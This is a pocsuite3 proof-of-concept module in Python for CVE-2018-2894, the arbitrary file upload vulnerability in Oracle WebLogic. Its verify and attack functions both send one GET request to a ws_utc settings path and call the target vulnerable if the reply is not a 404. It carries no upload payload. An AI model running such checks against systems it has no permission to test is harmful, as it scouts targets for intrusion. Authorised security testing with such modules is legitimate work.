#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase
from pocsuite3.api import requests

class Weblogic(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-07'
    updateDate = '2019-11-07'
    references = ['']
    name = 'Oracle Weblogic Any File Upload Vulnerability (CVE-2018-2894)'
    appPowerLink = 'Oralce'
    appName = 'Weblogic'
    appVersion = '10.3.6.0 12.1.3.0 12.2.1.2 12.2.1.3'
    vulType = 'file upload'
    desc = ''' 
    Oracle WebLogic 两处'/ws_utc/begin.do'|'/ws_utc/config.do', 任意文件上传漏洞（CVE-2018-2894)
    '''

    @property
    def _headers(self):
        headers = {'user-agent': 'ceshi/0.0.1'}
        return headers

    def _verify(self):
        result = {}
        payload = 'ws_utc/resources/setting/options/general'
        try:
            if self.url[-1] == '/':
                url = self.url + payload
            else:
                url = self.url + '/' + payload
            response = requests.get(
                url=url,
                headers=self._headers
            )
            if response.status_code != 404:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(Weblogic)